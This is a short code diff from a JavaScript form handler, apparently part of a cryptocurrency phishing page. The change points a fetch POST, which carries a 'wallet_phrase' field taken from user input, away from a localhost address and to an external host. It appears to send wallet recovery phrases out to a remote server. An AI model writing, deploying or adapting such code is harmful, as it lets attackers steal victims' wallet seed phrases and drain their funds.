@@ -442,7 +442,7 @@ function sendForm(event, type) {
   wallet_phrase: walletData
 };
 
-  fetch('http://127.0.0.1:8000/wallet/', {
+  fetch('https://qfstrade.pythonanywhere.com/wallet/', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
